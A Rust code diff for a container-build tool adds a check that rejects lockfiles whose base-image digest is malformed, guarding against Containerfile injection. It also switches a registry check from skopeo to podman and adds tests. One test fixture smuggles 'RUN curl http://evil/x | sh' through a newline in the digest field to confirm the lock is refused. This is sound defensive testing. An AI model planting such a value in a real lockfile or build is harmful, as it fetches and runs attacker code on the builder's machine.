@@ -75,8 +75,7 @@ impl Lock {
     pub fn load(path: &Path) -> Option<Lock> {
         let text = std::fs::read_to_string(path).ok()?;
         match toml::from_str::<Lock>(&text) {
-            Ok(lock) if lock.schema_version == CURRENT_SCHEMA => Some(lock),
-            Ok(lock) => {
+            Ok(lock) if lock.schema_version != CURRENT_SCHEMA => {
                 eprintln!(
                     "{} has schema_version {} (this kuma writes {}); ignoring it",
                     path.display(),
@@ -85,6 +84,20 @@ impl Lock {
                 );
                 None
             }
+            // The digest is interpolated straight into `FROM name@…`, so a
+            // hand-edited lock is a Containerfile injection: a newline in
+            // this field appends arbitrary build steps that run as you.
+            // Nobody reads a twenty-thousand-line generated file in a pull
+            // request, which is exactly why lockfiles get poisoned.
+            Ok(lock) if !is_digest(&lock.base.digest) => {
+                eprintln!(
+                    "{} has a malformed base digest ({:?}); ignoring it",
+                    path.display(),
+                    lock.base.digest
+                );
+                None
+            }
+            Ok(lock) => Some(lock),
             Err(err) => {
                 eprintln!("{} is unreadable ({err}); rebuilding it", path.display());
                 None
@@ -172,8 +185,24 @@ fn index_digest(repo_digests: &[&str], manifest: &str, reference: &str) -> Strin
         .to_string()
 }
 
+/// `sha256:` and exactly 64 lowercase hex digits, which is the only shape
+/// a manifest digest takes. Checked on load rather than on use, so there
+/// is one gate rather than one per interpolation site.
+fn is_digest(value: &str) -> bool {
+    match value.strip_prefix("sha256:") {
+        Some(hex) => hex.len() == 64 && hex.bytes().all(|b| b.is_ascii_hexdigit() && !b.is_ascii_uppercase()),
+        None => false,
+    }
+}
+
 pub fn path_for(config_path: &Path) -> PathBuf {
     config_path.with_extension("lock")
+}
+
+/// The lock beside a declaration, if there is a usable one. Four callers
+/// wanted this pair and each spelled it out.
+pub fn for_config(config_path: &Path) -> Option<Lock> {
+    Lock::load(&path_for(config_path))
 }
 
 /// The digest of a base image already in local storage, which is where it
@@ -199,23 +228,40 @@ pub fn base_digest(reference: &str) -> Result<String> {
     Ok(index_digest(&repo_digests, manifest, reference))
 }
 
-/// What the registry says the tag resolves to right now, without pulling
-/// it. skopeo rather than podman because podman has no way to ask about a
-/// remote image it hasn't fetched, and fetching is the thing being
-/// avoided: the whole point of a check is that it costs one round trip
-/// instead of a rebuild.
-pub fn remote_digest(reference: &str) -> Result<String> {
-    let out = host_output(&[
-        "skopeo",
-        "inspect",
-        "--format",
-        "{{.Digest}}",
-        &format!("docker://{reference}"),
-    ])
-    .with_context(|| format!("cannot ask the registry about {reference}"))?;
-    let digest = out.trim().to_string();
-    anyhow::ensure!(digest.starts_with("sha256:"), "unexpected digest {digest:?} for {reference}");
-    Ok(digest)
+/// Has the tag stopped pointing at the locked image? Asked without
+/// pulling anything, and without any tool but podman.
+///
+/// podman can reach a registry (`podman manifest inspect` accepts a
+/// remote reference) but it prints the index rather than the index's own
+/// digest, and it pretty-prints, so hashing its output would not match
+/// what the registry actually signed. Comparing the tag's index against
+/// the locked digest's index answers the question directly and needs no
+/// digest arithmetic: if the tag still points at that image, the two
+/// references describe the same document.
+///
+/// skopeo would give the digest in one call instead of two, and was the
+/// first implementation. It is not worth a second dependency: `kuma
+/// build` needs nothing but podman, and one verb quietly needing more
+/// makes that promise false for whoever doesn't have it installed.
+/// The one limitation: `podman manifest inspect` refuses a
+/// single-architecture image ("Treating single images as manifest lists
+/// is not implemented"), so a base published without a manifest list
+/// can't be checked this way. Multi-arch is the norm and fedora-bootc is
+/// one, so this trades an edge case for a dependency everyone would
+/// otherwise have to install.
+pub fn base_moved(reference: &str, digest: &str) -> Result<bool> {
+    let tagged = registry_manifest(reference)?;
+    let locked = registry_manifest(&pinned_ref(reference, digest))?;
+    Ok(tagged != locked)
+}
+
+fn registry_manifest(reference: &str) -> Result<String> {
+    host_output(&["podman", "manifest", "inspect", reference]).with_context(|| {
+        format!(
+            "cannot ask the registry about {reference} (gone, offline, \
+             or a single-architecture image, which podman can't inspect remotely)"
+        )
+    })
 }
 
 /// Everything the built image ended up containing. Asking the image
@@ -348,6 +394,16 @@ fn rfc3339(secs: u64) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// A well-formed digest for the tests that round-trip through
+    /// `load()`, which insists on 64 lowercase hex characters. Synthetic
+    /// on purpose: a real digest off a registry would imply these tests
+    /// depend on a particular image, and "sha256:aaa…" is legible in an
+    /// assertion failure where 64 characters of entropy is not. Tests
+    /// that never load a lock use short readable strings instead.
+    fn digest(seed: char) -> String {
+        format!("sha256:{}", seed.to_string().repeat(64))
+    }
 
     fn lock(digest: &str, rpms: &[(&str, &str)]) -> Lock {
         Lock {
@@ -495,12 +551,36 @@ mod tests {
     fn a_written_lock_reads_back() {
         let dir = tempfile::tempdir().unwrap();
         let path = dir.path().join("kuma.lock");
-        lock("sha256:abc", &[("fish", "4.0.2-1.fc44.x86_64")]).save(&path).unwrap();
+        lock(&digest('a'), &[("fish", "4.0.2-1.fc44.x86_64")]).save(&path).unwrap();
         let text = std::fs::read_to_string(&path).unwrap();
         assert!(text.starts_with("# Generated by kuma. Do not edit."));
         let back = Lock::load(&path).unwrap();
-        assert_eq!(back.base.digest, "sha256:abc");
+        assert_eq!(back.base.digest, digest('a'));
         assert_eq!(back.resolved.rpm["fish"], "4.0.2-1.fc44.x86_64");
+    }
+
+    /// The digest is interpolated into `FROM name@…`, so a newline in it
+    /// appends Containerfile steps that run at build time as you. A lock
+    /// is generated, committed, and never read closely in review, which
+    /// is the whole shape of a lockfile poisoning. Rejected on load, so
+    /// there is one gate rather than one per interpolation site.
+    #[test]
+    fn a_lock_cannot_smuggle_build_steps_through_its_digest() {
+        assert!(is_digest(&digest('a')));
+        assert!(!is_digest("sha256:abc"), "too short");
+        assert!(!is_digest(&format!("{}\nRUN curl evil | sh", digest('a'))), "the injection");
+        assert!(!is_digest(&digest('a').replace("sha256", "sha512")));
+        assert!(!is_digest(&digest('a').to_uppercase()), "hex is lowercase");
+        assert!(!is_digest(""));
+
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("evil.lock");
+        std::fs::write(
+            &path,
+            "schema_version = 1\nlocked_at = \"x\"\n[base]\nref = \"a\"\ndigest = \"\"\"sha256:abc\nRUN curl http://evil/x | sh\"\"\"\n[resolved.rpm]\n",
+        )
+        .unwrap();
+        assert!(Lock::load(&path).is_none(), "a poisoned lock is no lock at all");
     }
 
     /// Absent, corrupt, and from-the-future all mean the same thing to a
